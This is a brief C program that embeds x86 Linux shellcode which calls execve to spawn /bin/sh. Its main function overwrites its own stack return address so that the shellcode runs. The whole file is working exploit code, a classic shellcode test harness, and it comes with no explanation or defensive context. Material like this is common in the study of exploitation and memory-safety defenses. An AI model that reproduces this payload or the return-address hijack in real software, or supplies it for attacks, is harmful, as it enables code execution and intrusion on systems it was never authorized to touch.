#include <stdlib.h>
//shell
char sc1[] ="\x31\xc0\x50\x68\x2f\x2f\x73\x68"
            "\x68\x2f\x62\x69\x6e\x89\xe3\x50"
        	"\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
int main()
{
    int *ret;
    ret = (int *)&ret + 2;
    (*ret) = (int)sc1;
}
